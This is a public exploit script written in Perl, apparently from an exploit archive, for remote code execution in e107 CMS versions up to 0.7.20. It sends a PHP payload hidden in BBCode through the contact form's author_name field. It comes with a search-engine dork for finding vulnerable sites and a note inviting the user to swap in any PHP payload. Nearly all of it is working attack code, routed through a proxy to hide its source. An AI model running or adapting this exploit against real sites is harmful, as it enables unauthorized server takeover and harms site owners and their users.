# Exploit Title: e107 Code Exec
# Date: 05/22/10
# Author: McFly@e107.org
# Software Link: http://e107.org/edownload.php
# Version: e107 <= 0.7.20
# Tested on: Linux/Windows
 
#!/usr/bin/perl -w
#################################################
# e107 Code Exec // SploitAuthor: McFly@e107.org
#################################################
# These scrubs still haven't released an update!
# Here is a little bit of motivation for them to
# patch one of the most popular, and insecure of
# the PHP web apps available today.
#################################################
# DORK: inurl:e107_plugins
#################################################
 
use LWP::UserAgent;
 
my $path = $ARGV[0] or die("Usage: perl e107_phpbb.pl http://e107site/pathto/contact.php\n");
my $load = 'passthru(chr(105).chr(100))'; # Simple 'id' command. Put ur PHP payload here! :)
 
# Remove comment for proxy support
my $proxy = 'http://127.0.0.1:8118/';
$ENV{http_proxy} = $proxy ? $proxy: 0;
 
$ua = new LWP::UserAgent;
$ua->agent("Mozilla/5.0");
 
if ( $proxy )
{
    print "[*] Using proxy $proxy \n";
    $ua->env_proxy('1');
}
 
my $req = new HTTP::Request POST => $path;
   $req->content_type('application/x-www-form-urlencoded');
   $req->content("send-contactus=1&author_name=%5Bphp%5D$load%3Bdie%28%29%3B%5B%2Fphp%5D");
 
my $res = $ua->request($req);
my $data = $res->as_string;
 
if ( $data =~ /<td class=["']main_section['"]>(.*)/ )
{
    $data = $1;
    print "$data\n";
}
else
{
    print "$data\n";
}
